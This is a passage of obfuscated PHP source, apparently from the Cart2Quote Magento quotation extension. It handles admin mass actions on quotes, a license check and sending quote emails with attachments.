BLS2O: } catch (Exception $Zf0h2) { Mage::log("\x45\170\143\145\x70\x74\151\157\156\72\x20" . $Zf0h2->getMessage(), null, "\x63\62\x71\x5f\x65\x78\x63\x65\160\x74\x69\x6f\x6e\56\154\157\147", true); Mage::getSingleton("\x61\144\155\151\156\x68\164\x6d\154\57\x73\145\163\163\151\x6f\156")->addError($Zf0h2->getMessage()); } goto hTqDT; p7L5D: Mage::dispatchEvent("\157\x70\150\151\162\x61\x68\x5f\161\x71\x75\x6f\164\x65\141\144\x76\137\x61\x64\x6d\x69\x6e\137\155\141\163\x73\104\x65\x6c\x65\x74\145\137\142\145\146\157\162\x65", [$Hm_f1]); goto aP_1h; KnJqZ: $this->_redirect("\52\57\52\57\x69\156\x64\x65\170"); goto cqndR; cqndR: Mage::dispatchEvent("\157\160\150\x69\x72\x61\150\137\x71\x71\x75\x6f\164\x65\x61\144\x76\x5f\141\144\155\151\156\x5f\155\x61\163\x73\x44\145\154\x65\164\x65\137\141\146\x74\x65\162", [$Hm_f1]); goto ryn3E; oOqcY: if (Mage::getSingleton("\x61\x64\x6d\x69\x6e\57\163\x65\x73\163\151\157\156")->isAllowed("\x73\x61\154\145\x73\x2f\161\x71\x75\157\164\x65\x61\144\166\x2f\x61\143\164\x69\157\156\163\57\x6d\x61\x73\x73\x64\145\x6c\x65\164\145")) { goto jDZmV; } goto cuh96; b2ak3: jDZmV: goto oz4NB; omwWJ: glvfp: goto xXviC; oz4NB: $Hm_f1 = $this->getRequest()->getParam("\161\161\165\x6f\x74\145"); goto p7L5D; X8ejb: $this->_redirect("\52\57\52\57\151\156\144\145\170"); goto zyQIp; M_ruz: ddfa6: goto KnJqZ; cuh96: Mage::getSingleton("\141\144\155\151\156\x68\164\155\x6c\57\x73\x65\x73\x73\151\157\156")->addError(Mage::helper("\161\161\x75\157\164\x65\141\144\166")->__("\x4d\141\163\x73\x20\144\x65\154\145\164\145\x20\141\143\164\x69\157\x6e\40\151\163\40\157\x6e\154\x79\x20\141\154\x6c\157\167\145\x64\x20\146\157\162\x20\165\x73\x65\162\163\x20\167\151\164\150\x20\x70\x65\162\155\x69\163\x73\151\157\x6e\40\42\115\x61\x73\x73\x20\104\x65\x6c\x65\164\145\40\x51\165\157\164\145\42\x2e")); goto X8ejb; ryn3E: } public function massStatusAction() { goto WTdNe; IC3Nd: YoXVc: goto VLv75; NGu58: Mage::dispatchEvent("\x6f\x70\150\x69\162\x61\150\x5f\161\x71\x75\x6f\x74\145\x61\x64\166\x5f\x61\x64\x6d\x69\x6e\x5f\x6d\x61\x73\x73\x53\x74\141\164\165\x73\x5f\141\x66\x74\x65\x72", [$Hm_f1]); goto yBHYV; WTdNe: $Hm_f1 = $this->getRequest()->getParam("\x71\161\165\157\x74\x65"); goto EmDW6; Yz0dS: DEQh1: goto x0GoV; g9PmZ: try { goto zO67g; jkxdn: if (!is_object($YdMff)) { goto pn98F; } goto XQ1g3; AC0h3: foreach ($Hm_f1 as $KKBoU) { goto WzoPA; dIeKM: CYGW9: goto rfWT2; qlDjF: $QhB4D->unsetSubStatus(); goto JDUyh; qVMY5: MCaDo: goto Rg5RP; OM2o3: $QhB4D->setSubstatus($QhB4D->getStatus()); goto dIeKM; wePlH: if ($YdMff == Ophirah_Qquoteadv_Model_Status::STATUS_PROPOSAL_SAVED) { goto MCaDo; } goto qlDjF; Z9wXa: $QhB4D->setIsMassupdate(true); goto dkt_D; Rg5RP: if (!($QhB4D->getStatus() != Ophirah_Qquoteadv_Model_Status::STATUS_PROPOSAL_SAVED)) { goto CYGW9; } goto OM2o3; iVem7: Mage::dispatchEvent("\161\161\165\x6f\x74\145\141\x64\166\x5f\161\161\x61\144\166\x63\x75\x73\x74\157\155\x65\162\x5f\x61\146\x74\145\x72\163\x61\x76\145\137\155\141\x73\163\x53\x74\x61\164\x75\163", ["\x71\x75\x6f\164\145" => $QhB4D]); goto XqCOS; WzoPA: $QhB4D = Mage::getSingleton("\161\161\x75\157\x74\145\141\x64\x76\x2f\x71\161\x61\144\x76\x63\x75\163\164\157\x6d\x65\162")->load($KKBoU); goto wePlH; rfWT2: X3yoK: goto cicIi; dkt_D: $QhB4D->save(); goto iVem7; JDUyh: goto X3yoK; goto qVMY5; cicIi: $QhB4D->setStatus($YdMff); goto Z9wXa; XqCOS: NfHoF: goto zbGu8; zbGu8: } goto VmBVa; W2U_P: $this->_getSession()->addSuccess(Mage::helper("\x61\x64\x6d\151\156\150\x74\x6d\154")->__("\x54\157\164\141\x6c\x20\157\146\x20\x25\144\x20\162\x65\143\x6f\x72\144\50\163\51\40\x77\145\162\145\x20\165\160\x64\x61\x74\x65\x64", count($Hm_f1))); goto fFgyn; XQ1g3: $YdMff = $YdMff->getStatus(); goto vW7MQ; VmBVa: QIxed: goto W2U_P; zO67g: $Vm3MH = $this->getRequest()->getParam("\163\164\x61\164\x75\163"); goto oJoMr; vW7MQ: pn98F: goto AC0h3; oJoMr: $YdMff = Mage::getModel("\x71\x71\x75\157\x74\145\x61\x64\x76\57\x73\x74\x61\x74\165\163")->getStatus($Vm3MH); goto jkxdn; fFgyn: } catch (Exception $Zf0h2) { Mage::log("\x45\x78\x63\145\x70\164\151\157\156\x3a\x20" . $Zf0h2->getMessage(), null, "\x63\62\161\137\x65\170\x63\145\160\x74\x69\157\156\x2e\x6c\x6f\x67", true); $this->_getSession()->addError($Zf0h2->getMessage()); } goto W6PTM; EmDW6: Mage::dispatchEvent("\157\x70\150\151\162\x61\x68\x5f\161\161\165\x6f\x74\145\x61\144\x76\x5f\x61\144\x6d\151\x6e\137\x6d\x61\163\x73\123\164\x61\164\165\163\x5f\142\x65\x66\157\162\145", [$Hm_f1]); goto NkfGL; W6PTM: goto YoXVc; goto Yz0dS; x0GoV: Mage::getSingleton("\141\144\x6d\x69\x6e\150\x74\155\154\57\x73\x65\163\163\x69\157\156")->addError(Mage::helper("\x63\141\x74\x61\x6c\x6f\x67")->__("\x50\x6c\145\x61\x73\145\x20\163\x65\x6c\x65\x63\x74\40\x69\164\145\155\x73\x2e")); goto IC3Nd; NkfGL: if (!is_array($Hm_f1)) { goto DEQh1; } goto g9PmZ; VLv75: $this->_redirect("\52\57\x2a\57\x69\x6e\x64\x65\170"); goto NGu58; yBHYV: } public function massFollowupAction() { goto Pa5YU; zWaFf: if (!is_array($Hm_f1)) { goto iM6cM; } goto uN1fK; Pa5YU: $Hm_f1 = $this->getRequest()->getParam("\x71\161\165\157\x74\145"); goto hrWtG; uN1fK: try { goto rDsDA; XY4bc: jQRY9: goto pCfjR; pCfjR: $this->_getSession()->addSuccess(Mage::helper("\x61\144\155\x69\x6e\150\164\155\x6c")->__("\x54\157\164\x61\x6c\x20\157\146\x20\45\144\x20\x72\145\x63\157\x72\144\50\x73\x29\40\x77\x65\162\145\x20\x75\160\x64\x61\164\145\x64", count($Hm_f1))); goto KU4e2; rDsDA: foreach ($Hm_f1 as $KKBoU) { goto R5DCL; hdfOJ: sadYT: goto MOwKS; nO8SW: $QhB4D = Mage::getSingleton("\x71\x71\x75\157\x74\145\141\x64\166\x2f\161\x71\141\144\166\143\165\163\164\157\x6d\145\162")->load($KKBoU)->setFollowup()->setIsMassupdate(true)->save(); goto vFZtl; lpA0C: goto xb3QM; goto hdfOJ; iKPOW: gJhfv: goto G7ycI; MOwKS: $QhB4D = Mage::getSingleton("\x71\x71\165\157\164\145\x61\144\x76\x2f\x71\x71\141\144\166\x63\165\x73\164\x6f\155\145\162")->load($KKBoU)->setFollowup($this->getRequest()->getParam("\x66\x6f\x6c\154\157\167\165\x70"))->setIsMassupdate(true)->save(); goto vW74B; e1UZb: xb3QM: goto iKPOW; vW74B: Mage::dispatchEvent("\x71\x71\x75\157\164\x65\x61\144\x76\x5f\161\x71\141\144\166\x63\165\x73\164\x6f\155\145\162\x5f\141\146\164\x65\x72\163\x61\166\x65\137\x6d\x61\x73\x73\106\157\154\x6c\x6f\167\x75\160", ["\x71\165\157\164\145" => $QhB4D]); goto e1UZb; vFZtl: Mage::dispatchEvent("\161\x71\165\157\164\145\x61\144\x76\x5f\x71\161\141\x64\166\x63\165\163\164\157\155\145\x72\x5f\x61\x66\164\145\x72\x73\x61\x76\x65\x5f\x6d\x61\163\163\106\157\x6c\154\x6f\167\x75\160", ["\x71\165\157\x74\145" => $QhB4D]); goto lpA0C; R5DCL: if (strtotime($this->getRequest()->getParam("\x66\157\154\154\157\x77\x75\x70"))) { goto sadYT; } goto nO8SW; G7ycI: } goto XY4bc; KU4e2: } catch (Exception $Zf0h2) { Mage::log("\x45\170\x63\145\160\164\151\x6f\x6e\x3a\40" . $Zf0h2->getMessage(), null, "\143\x32\161\x5f\x65\170\143\x65\x70\164\x69\x6f\156\x2e\x6c\x6f\x67", true); $this->_getSession()->addError($Zf0h2->getMessage()); } goto H6V4Q; zLj3j: Xw5YN: goto WSJnc; WSJnc: $this->_redirect("\x2a\x2f\52\x2f\151\x6e\x64\145\x78"); goto ScSiu; hrWtG: Mage::dispatchEvent("\x6f\x70\150\x69\x72\x61\x68\x5f\161\161\165\157\x74\145\141\144\166\137\x61\x64\x6d\151\156\x5f\x6d\x61\x73\163\106\x6f\154\x6c\x6f\167\165\x70\x5f\x62\x65\146\157\x72\x65", [$Hm_f1]); goto zWaFf; isYAn: Mage::getSingleton("\x61\144\x6d\x69\x6e\150\x74\155\x6c\x2f\x73\x65\x73\x73\x69\x6f\x6e")->addError(Mage::helper("\143\141\164\x61\154\157\147")->__("\x50\154\x65\141\x73\145\x20\x73\x65\x6c\x65\143\x74\40\x69\x74\145\155\163\56")); goto zLj3j; H6V4Q: goto Xw5YN; goto O7H1S; O7H1S: iM6cM: goto isYAn; ScSiu: Mage::dispatchEvent("\157\160\x68\151\162\141\x68\137\161\x71\165\157\x74\145\141\x64\x76\x5f\141\144\x6d\x69\x6e\137\155\141\x73\163\x46\x6f\154\x6c\157\167\165\x70\x5f\141\x66\x74\x65\x72", [$Hm_f1]); goto UrSmY; UrSmY: } public function massUpdateAction() { goto c5h8R; CllNE: $WzFf2 = $this->__("\124\150\x69\163\40\146\x75\156\143\x74\x69\157\x6e\40\151\x73\40\157\156\154\x79\x20\141\166\141\151\154\x61\x62\154\x65\x20\151\x6e\40\x74\x68\145\x20\145\156\164\x65\x72\160\x72\151\163\x65\40\50\156\x6f\x6e\x2d\x74\x72\151\141\x6c\51\x20\x65\144\x69\164\x69\x6f\156\x2e\x20\74\x61\x20\x68\x72\145\x66\75\47\150\x74\164\x70\163\72\x2f\57\167\167\x77\x2e\x63\x61\x72\164\x32\161\x75\157\164\145\x2e\143\157\155\x2f\155\x61\147\145\156\164\x6f\55\161\165\157\164\x61\x74\151\157\x6e\x2d\155\x6f\x64\165\x6c\145\x2d\x70\162\x69\x63\x69\156\147\x2e\x68\164\x6d\154\47\x3e\125\160\x67\x72\x61\144\x65\x3c\57\x61\x3e"); goto GXb_v; GXb_v: Mage::getSingleton("\141\x64\155\x69\x6e\x68\164\155\154\57\x73\x65\x73\x73\x69\157\x6e")->addNotice($WzFf2); goto ywYWW; BdPuv: if (!$this->getRequest()->isXmlHttpRequest()) { goto LYrMs; } goto QtFX3; Vdac0: l0qHb: goto PHp0S; oQqFD: sfEs3: goto BdPuv; ywYWW: goto l0qHb; goto oQqFD; IOaJl: LYrMs: goto Vdac0; yBAeK: if (Mage::helper("\x71\x71\165\157\x74\145\x61\x64\166\57\x6c\x69\143\145\x6e\x73\145")->validLicense("\x6d\141\x73\163\x5f\x75\x70\144\141\164\x65\x5f\x71\x75\x6f\x74\x65\137\162\x65\x71\165\x65\x73\x74\x73")) { goto sfEs3; } goto CllNE; QtFX3: Mage::getModel("\161\161\x75\157\164\145\x61\x64\166\57\x6d\141\x73\x73\x75\160\144\x61\164\145")->startMassUpdateAllowedToQuote($this->getRequest()->getParam("\161\x75\157\x74\x65\x5f\155\x6f\x64\x65"), $this->getRequest()->getParam("\x72\x61\x6e\x67\x65\x73")); goto IOaJl; PHp0S: Mage::dispatchEvent("\157\160\x68\151\x72\x61\150\x5f\x71\161\165\x6f\x74\x65\141\144\166\137\141\x64\155\151\156\x5f\x6d\x61\x73\x73\x55\160\144\141\164\x65\x5f\x61\x66\164\145\162", [$this->getRequest()->getParam("\x72\141\156\x67\145\163")]); goto B39Ji; c5h8R: Mage::dispatchEvent("\x6f\x70\x68\151\x72\141\150\x5f\x71\161\165\x6f\x74\145\x61\x64\x76\137\141\144\x6d\x69\156\137\x6d\x61\x73\x73\x55\x70\144\x61\x74\x65\x5f\x62\x65\146\157\162\x65", [$this->getRequest()->getParam("\x72\x61\x6e\147\x65\163")]); goto yBAeK; B39Ji: } public function sendEmail($BhWOR) { goto FlEhB; J913P: V2XbG: goto ct5NG; DIbwB: EjqG0: goto WY_Gs; iFI48: $um9Hu = explode("\x3b", $gatwK); goto dkZDH; CRP43: zrtZ5: goto sr76k; Vnegu: goto q5pFM; goto qtKz9; kbrlo: $t0jka = $pyRnz; goto aqEWn; pAqC1: $pw8he["\162\x65\155\141\162\x6b"] = $Qgmek; goto gSvCs; ukzb6: $HYkyg = []; goto eXIEG; WY_Gs: $pw8he["\x71\x75\157\164\145"] = $FsnNf; goto Cf8zy; AAqmn: QavBZ: goto dVxs2; eXIEG: $hewCg = []; goto u5RoP; pj9B3: ZJlwB: goto kbrlo; Ww49G: $pw8he["\154\151\x6e\x6b"] = Mage::helper("\x71\161\x75\157\164\x65\x61\x64\x76\57\x6c\151\143\x65\156\163\x65\x63\x68\x65\x63\x6b\x73")->getAutoLoginUrl($FsnNf, 1162/581); goto CwFhh; WQe8e: $FsnNf = $this->getQuotationQuote($this->lk8Na); goto L94YO; VjO3U: $Qgmek = nl2br($Qgmek); goto pAqC1; aqEWn: FMl1i: goto rADBw; mf2Sd: $k0exX->setSenderEmail($Pkf2Q["\145\x6d\x61\151\154"]); goto HfMTG; jgHPA: if (!Mage::getStoreConfig("\161\x71\x75\x6f\164\145\x61\144\166\x5f\x71\x75\x6f\x74\145\x5f\145\x6d\141\x69\154\x73\57\x61\164\164\141\143\x68\155\145\156\164\163\x2f\160\x64\x66", $FsnNf->getStoreId())) { goto zwD0j; } goto O1X9o; TCV63: if (!((bool) Mage::getStoreConfig("\x71\161\165\x6f\x74\x65\141\144\x76\137\161\x75\157\x74\145\x5f\145\x6d\x61\151\154\163\x2f\x73\141\154\145\x73\x5f\162\145\x70\162\x65\x73\x65\x6e\164\141\164\x69\166\145\x73\x2f\163\145\x6e\x64\137\x6c\151\156\x6b\x65\x64\137\x73\x61\x6c\x65\137\x62\143\143", $FsnNf->getStoreId()) && Mage::helper("\161\x71\165\157\164\145\x61\x64\166\x2f\x6c\x69\143\145\x6e\163\x65\143\150\x65\143\153\163")->isAllowedSalesBcc())) { goto qtR41; } goto KMz0J; d8KKD: $pw8he["\141\164\164\x61\x63\x68\137\160\x64\146"] = $pw8he["\x61\164\x74\141\143\x68\137\144\157\x63"] = false; goto jgHPA; qtKz9: yPE_f: goto cJObk; MvnrN: if (!$gatwK) { goto qB7QB; } goto iFI48; E7UCp: $LFLk5 = Mage::getBaseDir(Mage_Core_Model_Store::URL_TYPE_MEDIA) . DS . "\x71\165\157\164\145\x61\x64\x76" . DS . $Oio5U; goto G7Zc0; w73Nl: foreach ($HYkyg as $WzFf2) { Mage::getSingleton("\141\x64\x6d\x69\156\150\x74\155\x6c\x2f\163\x65\163\163\x69\x6f\x6e")->addError($WzFf2); V3RWZ: } goto EQHPa; zDzxA: qB7QB: goto TCV63; oLIj5: $pyRnz = Mage::getStoreConfig("\x71\x71\165\x6f\x74\x65\x61\144\166\x5f\161\x75\157\164\145\137\145\155\x61\151\154\x73\57\164\145\155\x70\154\x61\x74\145\163\57\x70\162\157\160\x6f\163\141\154", $FsnNf->getStoreId()); goto Ja01N; Ax_HX: if (!($pyRnz != $BHP1_)) { goto V2XbG; } goto s_B_4; a1scw: $k0exX = Mage::helper("\161\x71\165\157\164\145\141\x64\x76\57\145\155\x61\x69\154")->getEmailTemplateModel($FsnNf->getStoreId()); goto oLIj5; cJObk: $k0exX->load($t0jka); goto b_vmn; BkB7Y: $TsFwc = Mage::getSingleton("\x63\x6f\162\145\57\x61\160\160\x5f\145\x6d\x75\154\141\164\x69\157\156"); goto VQ1qK; zuQx0: $pw8he["\x73\x74\157\x72\x65"] = Mage::app()->getStore($FsnNf->getStoreId()); goto a1scw; FlEhB: $pw8he = []; goto Yfd17; MzyRq: $Oio5U = Mage::getStoreConfig("\x71\161\x75\157\x74\145\x61\x64\166\x5f\161\165\157\164\x65\x5f\x65\155\x61\x69\154\163\x2f\141\164\x74\x61\143\150\155\x65\x6e\164\x73\x2f\x64\x6f\x63", $FsnNf->getStoreId()); goto IxIX4; EwHcL: if (empty($pTAGS)) { goto RcPAE; } goto xHIaL; y4VW0: $YBSdJ = $FsnNf->getIncrementId() ? $FsnNf->getIncrementId() : $FsnNf->getId(); goto t9e6A; IxIX4: if (!$Oio5U) { goto zrtZ5; } goto E7UCp; lbVrs: $TsFwc->stopEnvironmentEmulation($F1YIf); goto iWsDC; vffXC: qtR41: goto ZCgOw; EQHPa: XSC4R: goto DIbwB; HlIyY: $k0exX->setData("\x63\x32\161\x50\x61\162\141\x6d\x73", $BhWOR); goto UuXjg; xHIaL: $pw8he["\141\144\x6d\x69\156\156\141\x6d\145"] = $pTAGS; goto zSOZw; i0jB8: $Rq0Gf = Mage::getModel("\161\x71\165\x6f\x74\x65\x61\x64\x76\x2f\x70\x64\x66\x5f\x71\x71\x75\157\164\x65")->getPdf($FsnNf); goto w03CF; O1X9o: $FsnNf->F_sgo = true; goto qTL1X; HfMTG: $gatwK = Mage::getStoreConfig("\161\x71\x75\157\x74\145\x61\144\166\x5f\161\x75\157\164\x65\137\145\x6d\141\151\x6c\163\57\x73\x61\154\145\x73\x5f\x72\145\x70\162\x65\x73\x65\156\164\141\x74\151\x76\145\163\57\142\143\143", $FsnNf->getStoreId()); goto MvnrN; sr76k: $Qgmek = Mage::getStoreConfig("\x71\161\x75\157\x74\145\x61\144\x76\137\x71\165\x6f\164\145\137\143\157\x6e\146\x69\147\165\162\x61\x74\x69\157\x6e\57\x70\162\x6f\x70\157\163\x61\154\x2f\x71\161\x75\157\164\145\141\x64\166\137\x72\145\x6d\141\x72\x6b", $FsnNf->getStoreId()); goto FigWz; w03CF: $FsnNf->F_sgo = false; goto y4VW0; MNfox: $pTAGS = $this->getAdminName($FsnNf->getUserId()); goto u43hI; SCCfD: goto FMl1i; goto pj9B3; T4a4U: $HYkyg = array_merge($HYkyg, $hewCg); goto w73Nl; u43hI: $pTAGS = trim($pTAGS); goto q5fB6; zwT0y: return $BHP1_; goto UsfF_; s_B_4: if ($pyRnz) { goto ZJlwB; } goto Wx1c7; dVxs2: $BHP1_ = Ophirah_Qquoteadv_Model_System_Config_Source_Email_Templatedisable::VALUE_DISABLED_EMAIL; goto Ax_HX; EDKHa: Mage::dispatchEvent("\x6f\x70\x68\x69\x72\x61\x68\137\x71\x71\165\157\x74\x65\x61\x64\x76\137\141\x64\x64\x53\x65\156\x64\x4d\141\x69\x6c\137\x61\x66\x74\145\x72", ["\x74\x65\x6d\160\154\x61\x74\145" => $k0exX, "\162\145\x73\x75\x6c\x74" => $NYN03]); goto lbVrs; m13JD: zwD0j: goto MzyRq; dkZDH: $k0exX->addBcc($um9Hu); goto zDzxA; Yfd17: $this->lk8Na = (int) $this->getRequest()->getParam("\151\x64"); goto WQe8e; GY4wF: if (!count($hewCg)) { goto EjqG0; } goto T4a4U; G7Zc0: try { goto vVjRy; UWQk7: $pw8he["\x61\164\164\x61\143\x68\137\x64\157\x63"] = true; goto I0PgM; lS1G8: $g0qw2 = $OgbbW["\x62\x61\163\x65\x6e\141\155\145"]; goto GuEhy; O_YAC: $OgbbW = pathinfo($LFLk5); goto lS1G8; pY4pU: $RpScD = Mage::helper("\161\x71\165\157\x74\145\x61\144\166\x2f\146\151\154\145")->getMimeType($LFLk5); goto O_YAC; vVjRy: $JAjfq = file_get_contents($LFLk5); goto pY4pU; GuEhy: $k0exX->getMail()->createAttachment($JAjfq, $RpScD, Zend_Mime::DISPOSITION_ATTACHMENT, Zend_Mime::ENCODING_BASE64, $g0qw2); goto UWQk7; I0PgM: } catch (Exception $Zf0h2) { Mage::log("\x45\x78\143\x65\x70\x74\x69\157\156\72\40" . $Zf0h2->getMessage(), null, "\143\x32\x71\137\145\x78\x63\145\160\164\x69\157\156\56\154\157\147", true); } goto CRP43; t9e6A: try { goto m8paM; d0yTQ: $pw8he["\141\x74\x74\141\x63\x68\x5f\160\144\x66"] = true; goto GKj15; m8paM: $JAjfq = $Rq0Gf->render(); goto uygmV; uygmV: $woZGu = Mage::helper("\x71\161\x75\x6f\164\x65\141\144\x76")->__("\120\x72\x69\x63\x65\x5f\160\162\157\160\157\163\141\154\137\45\x73", $YBSdJ); goto uu0tP; uu0tP: $k0exX->getMail()->createAttachment($JAjfq, "\141\160\160\154\151\143\141\x74\151\x6f\x6e\57\x70\x64\x66", Zend_Mime::DISPOSITION_ATTACHMENT, Zend_Mime::ENCODING_BASE64, $woZGu . "\56\x70\144\x66"); goto d0yTQ; GKj15: } catch (Exception $Zf0h2) { Mage::log("\x45\170\143\145\x70\164\151\157\x6e\x3a\40" . $Zf0h2->getMessage(), null, "\143\62\161\x5f\145\x78\x63\x65\x70\164\x69\x6f\156\56\154\157\147", true); } goto m13JD; uofNq: $NYN03 = $k0exX->send($BhWOR["\x65\x6d\141\151\x6c"], $BhWOR["\x6e\x61\x6d\x65"], $pw8he); goto EDKHa; zSOZw: RcPAE: goto Ww49G; u5RoP: foreach ($VL1OD as $oKO1P) { goto LrcBe; IeFJj: ig5bw: goto Fw2S4; aHF50: if (!$zjhFp->getData("\150\141\163\x5f\145\x72\x72\x6f\162")) { goto ytk0D; } goto RMLA3; QVXER: ytk0D: goto IeFJj; RMLA3: $hewCg[] = $zjhFp->getData("\x6d\145\x73\163\141\x67\145"); goto QVXER; LrcBe: $zjhFp = Mage::helper("\161\161\x75\x6f\164\x65\141\144\x76")->isInStock($oKO1P->getData("\x70\162\x6f\x64\x75\x63\x74\137\151\x64")); goto aHF50; Fw2S4: } goto yiBMv; rADBw: $eRgAa = Mage::getStoreConfig("\x67\145\x6e\145\162\x61\x6c\x2f\x6c\157\x63\x61\154\145\x2f\143\x6f\144\145", $FsnNf->getStoreId()); goto bcwTa; gSvCs: JTS52: goto MNfox; RW3ex: oeuXA: goto EwHcL; iWsDC: return $NYN03; goto J913P; L94YO: $VL1OD = Mage::getModel("\161\x71\165\x6f\x74\145\x61\144\x76\x2f\x71\161\x61\144\166\160\x72\x6f\144\x75\143\x74")->getCollection()->addFieldToFilter("\x71\x75\x6f\164\145\x5f\x69\x64", $this->lk8Na)->load(); goto ukzb6; q5fB6: if (!empty($pTAGS)) { goto oeuXA; } goto aE3Ql; cIzNs: $k0exX->setSenderName($Pkf2Q["\x6e\141\155\145"]); goto mf2Sd; A0vW4: $k0exX->loadDefault($t0jka, $eRgAa); goto Vnegu; KMz0J: $k0exX->addBcc(Mage::getModel("\141\x64\155\151\156\x2f\x75\x73\145\162")->load($FsnNf->getUserId())->getEmail()); goto vffXC; bcwTa: if (is_numeric($t0jka)) { goto yPE_f; } goto A0vW4; Ja01N: if (!(Mage::getStoreConfig("\161\x71\x75\157\164\145\x61\x64\166\x5f\x61\144\x76\141\x6e\143\145\144\137\x73\145\x74\x74\x69\x6e\x67\163\57\143\x68\145\x63\x6b\157\x75\164\57\x63\150\x65\x63\x6b\157\x75\x74\x5f\141\x6c\x74\145\x72\x6e\141\164\x69\166\145", $FsnNf->getData("\163\x74\157\x72\145\137\x69\144")) && $FsnNf->getData("\x61\154\x74\137\143\150\x65\x63\153\157\165\164"))) { goto QavBZ; } goto MRf0q; qTL1X: $FsnNf->collectTotals(); goto i0jB8; Cf8zy: $pw8he["\143\x75\x73\164\x6f\x6d\145\162"] = Mage::getModel("\143\165\163\x74\x6f\x6d\145\x72\57\143\x75\163\164\157\x6d\x65\x72")->load($FsnNf->getCustomerId()); goto zuQx0; Wx1c7: $t0jka = self::yvFKk; goto SCCfD; VQ1qK: $F1YIf = $TsFwc->startEnvironmentEmulation($FsnNf->getStoreId()); goto HlIyY; ct5NG: Mage::getSingleton("\x61\x64\x6d\151\x6e\150\x74\155\154\x2f\163\x65\163\163\151\157\156")->addError("\x51\165\157\x74\x65\x20\145\x6d\x61\151\x6c\x20\151\x73\x20\x64\151\x73\141\142\154\145\x64"); goto zwT0y; yiBMv: IPlRK: goto GY4wF; ZCgOw: $k0exX->setDesignConfig(["\x73\x74\x6f\162\145" => $FsnNf->getStoreId()]); goto BkB7Y; aE3Ql: $pTAGS = $this->getAdminName(Mage::getSingleton("\x61\144\155\x69\156\x2f\x73\145\x73\163\x69\x6f\156")->getUser()->getId()); goto RW3ex; CwFhh: $Pkf2Q = $FsnNf->getEmailSenderInfo(); goto cIzNs; UuXjg: Mage::dispatchEvent("\157\160\150\x69\162\141\150\x5f\161\x71\x75\157\x74\145\141\144\166\x5f\141\144\144\123\145\x6e\144\x4d\x61\151\154\137\142\x65\146\x6f\x72\x65", ["\x74\145\x6d\160\154\141\x74\x65" => $k0exX]); goto uofNq; FigWz: if (!$Qgmek) { goto JTS52; } goto VjO3U; MRf0q: $pyRnz = Mage::getStoreConfig("\161\x71\165\x6f\x74\x65\141\144\166\x5f\141\x64\x76\141\156\143\145\144\137\x73\x65\164\x74\x69\x6e\147\163\57\143\150\145\x63\x6b\157\x75\164\57\x63\150\x65\x63\153\x6f\x75\164\x5f\141\x6c\164\x65\x72\156\141\x74\x69\166\145\x5f\x65\155\x61\x69\x6c", $FsnNf->getStoreId()); goto AAqmn; b_vmn: q5pFM: goto d8KKD; UsfF_: } public function sendEmailSalesRep($FsnNf, $SUp8f) { goto mdDOn; ujSdy: Mage::dispatchEvent("\x6f\160\150\x69\x72\141\150\x5f\161\x71\165\157\164\x65\141\x64\166\x5f\141\144\144\123\145\156\x64\115\141\x69\154\x5f\142\145\x66\x6f\162\x65", ["\164\x65\x6d\160\154\x61\164\145" => $k0exX]); goto ItZM8; Z71RH: $t0jka = $pyRnz; goto Hl2IR; LTJCn: $k0exX->loadDefault($t0jka); goto SHB8u; RVjwU: $k0exX->setSenderName($Pkf2Q["\156\141\x6d\x65"]); goto B3ean; SXabZ: if (!empty($NYN03)) { goto iENHk; } goto taWL4; PqpVG: $kJ7D2 = array_filter(explode("\73", $kJ7D2)); goto Mrdrs; DMznY: $k0exX->load($t0jka); goto injeZ; lI5NF: if (is_numeric($t0jka)) { goto rBgnp; } goto LTJCn; Tk11y: iENHk: goto SUb2f; ar5wT: goto Wo21d; goto LScVB; injeZ: U6b4r: goto o3je7; wAo03: rBgnp: goto DMznY; YTYy3: vagum: goto QsBpD; aCqoP: $BHP1_ = Ophirah_Qquoteadv_Model_System_Config_Source_Email_Templatedisable::VALUE_DISABLED_EMAIL; goto GGwFT; SHB8u: goto U6b4r; goto wAo03; wSykW: $t0jka = self::cUXeM; goto ar5wT; Qa3f3: if ($pyRnz) { goto Cyndz; } goto wSykW; v6i6L: Mage::dispatchEvent("\157\x70\150\151\x72\x61\x68\x5f\161\161\165\157\164\x65\141\144\x76\x5f\141\144\144\x53\145\156\x64\x4d\x61\151\x6c\137\141\146\x74\145\x72", ["\x74\145\155\x70\x6c\141\164\145" => $k0exX, "\162\x65\163\165\154\x74" => $NYN03]); goto SXabZ; Hl2IR: Wo21d: goto lI5NF; o3je7: $Pkf2Q = $FsnNf->getEmailSenderInfo(); goto RVjwU; yKvBr: Mage::log("\105\x78\143\145\x70\x74\x69\157\x6e\72\40\x52\145\161\165\x65\163\164\x4e\157\x74\151\x66\x69\143\141\x74\151\x6f\x6e\x3a\40" . $WzFf2, null, "\143\x32\x71\x5f\x65\x78\143\x65\x70\x74\151\157\156\56\154\157\147", true); goto Tk11y; B3ean: $k0exX->setSenderEmail($Pkf2Q["\145\x6d\141\x69\154"]); goto ujSdy; Mrdrs: $k0exX = Mage::helper("\x71\x71\x75\x6f\x74\145\x61\x64\166\x2f\x65\x6d\141\x69\x6c")->getEmailTemplateModel($FsnNf->getStoreId()); goto aCqoP; ItZM8: $NYN03 = $k0exX->send($kJ7D2, null, $pw8he); goto v6i6L; DPBL1: if (!($pyRnz != $BHP1_ && count($kJ7D2) > 0)) { goto Kr1T7; } goto QGY7r; QGY7r: $pw8he = ["\x71\165\157\164\145\x55\x72\x6c" => Mage::helper("\141\144\x6d\x69\x6e\150\164\155\154")->getUrl("\x61\x64\155\151\x6e\150\164\155\x6c\x2f\x72\145\x64\151\x72\145\x63\x74\57\161\165\x6f\164\145\x45\144\x69\164", ["\151\144" => $FsnNf->getId()]), "\161\165\157\x74\x65" => Mage::getModel("\161\161\165\x6f\x74\145\141\144\x76\x2f\161\x71\141\144\166\143\x75\163\x74\157\155\145\x72")->load($FsnNf->getId()), "\x63\x75\x73\x74\157\155\x65\162" => Mage::getModel("\143\165\x73\x74\x6f\155\145\x72\57\143\165\163\164\x6f\x6d\x65\162")->load($FsnNf->getCustomerId()), "\x71\x75\157\164\145\111\x64" => $FsnNf->getId()]; goto Qa3f3; taWL4: $WzFf2 = Mage::helper("\x4f\160\x68\151\x72\141\x68\x5f\x52\145\x71\x75\x65\x73\x74\x4e\x6f\x74\151\146\x69\x63\x61\164\151\157\x6e")->__("\121\x71\165\x6f\164\145\40\x72\145\x71\165\145\163\164\x20\x65\155\x61\151\x6c\40\156\157\x74\151\146\x69\143\x61\x74\x69\157\156\x20\167\141\163\47\164\40\x73\145\x6e\164\x20\x71\165\x6f\164\x65\40\43\x25\x73", $FsnNf->getId()); goto yKvBr; mdDOn: $kJ7D2 = 